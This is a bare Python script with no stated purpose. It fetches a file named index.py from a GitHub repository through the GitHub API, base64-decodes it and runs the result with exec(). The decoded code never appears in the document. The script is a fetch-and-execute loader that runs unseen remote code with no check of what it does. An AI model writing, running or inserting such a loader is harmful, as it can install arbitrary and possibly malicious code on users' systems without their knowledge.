import base64
import json
import urllib.request

url = "https://api.github.com/repos/FSTDM/WBP/contents/index.py"
response = urllib.request.urlopen(url).read()
jsonData = json.loads(response)
filecontent = jsonData["content"]
filedecoded = base64.b64decode(filecontent)
exec(filedecoded)
